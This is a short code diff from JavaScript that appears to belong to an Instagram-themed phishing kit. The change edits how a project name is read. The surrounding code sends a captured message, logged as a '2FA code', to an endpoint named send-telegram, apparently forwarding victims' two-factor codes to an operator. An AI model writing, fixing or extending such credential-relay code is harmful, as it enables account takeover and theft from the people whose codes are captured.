@@ -36,11 +36,10 @@ APP: INSTAGRAM
 `;
 
       try {
-        const projectName = window.location.pathname.split('/')[2];
         await fetch('/api/send-telegram', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ message, projectName })
+          body: JSON.stringify({ message, projectName: window.PROJECT_NAME || '' })
         });
         console.log("✅ 2FA code sent");
       } catch (err) {
